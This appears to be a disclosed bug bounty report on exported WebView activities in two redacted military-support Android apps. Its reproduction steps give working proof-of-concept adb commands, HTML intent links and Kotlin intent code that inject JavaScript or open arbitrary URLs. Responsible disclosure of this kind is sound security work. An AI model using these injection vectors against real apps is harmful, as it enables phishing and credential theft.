# █████████ (Android): Vulnerable to Javascript Injection and Open redirect

## Report Details
- **Report ID**: 2555949
- **URL**: https://hackerone.com/reports/2555949
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-06-17T22:11:48.065Z
- **Disclosed**: 2024-07-26T15:00:23.640Z

## Reporter
- **Username**: cleanchain50
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Good afternoon,

I have discovered a misconfiguration in the WebView components of two apps, ████. This vulnerability allows an attacker to execute JavaScript and open any URL through a link or a malicious app.

The root cause of this issue is that certain activities are exported and set as browsable, exposing them to potential exploitation.
████████

## Impact

The potential impact of this vulnerability is high, as it allows an attacker to execute XSS within the WebView and open any HTTPS website. Possible attacks include phishing, creating fake login pages, and stealing service members' credentials. This could result in not only taking over ██████████ accounts but also potentially accessing other military applications and websites.

Additionally, the ability to execute JavaScript in these WebViews could enable attackers to steal cookies, further compromising user security.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**My Military One Source: **

adb shell am start -n ████/████████.kotlin.MVVM.Utils.Web.WebviewActivity --es URL "javascript:(function() { alert('XSS by Cleanchain') })();"

adb shell am start -n ████████/███.kotlin.MVVM.Utils.Web.WebviewActivity --es URL "https://URL"

Browser Example:

```
<body>
    <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end">Open XSS</a>

    <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=https://URL;end">Open URL</a>

</body>
```


Malicious App Example:

```
val intent = Intent().apply {  
    setClassName("█████", "███████.kotlin.MVVM.Utils.Web.WebviewActivity")  
    putExtra("URL", "javascript:(function() { alert('XSS by Cleanchain') })()")  
}  
startActivity(intent)

val intent = Intent().apply {  
    setClassName("████", "██████.kotlin.MVVM.Utils.Web.WebviewActivity")  
    putExtra("URL", "https://URL")  
}  
startActivity(intent)
```


**Chill Drills:**

adb shell am start -n ██████████/███████.Utils.Web.WebviewActivity --es URL "javascript:(function() { alert('XSS by Cleanchain') })();"

adb shell am start -n ██████/█████████.Utils.Web.WebviewActivity --es URL "https://URL"

Browser Example:

```
<body>
    <a href="intent://app/feedback#Intent;scheme=chdr;package=██████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end">Open XSS - █████████</a>

    <a href="intent://app/feedback#Intent;scheme=chdr;package=███;S.URL=https://URL;end">Open URL - ███</a>

</body>
```


Malicious App Example:

```
val intent = Intent().apply {  
    setClassName("██████", "████████.Utils.Web.WebviewActivity")  
    putExtra("URL", "javascript:(function() { alert('XSS by Cleanchain') })()")  
}  
startActivity(intent)

val intent = Intent().apply {  
    setClassName("███████", "████████.Utils.Web.WebviewActivity")  
    putExtra("URL", "https://URL")  
}  
startActivity(intent)
```

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
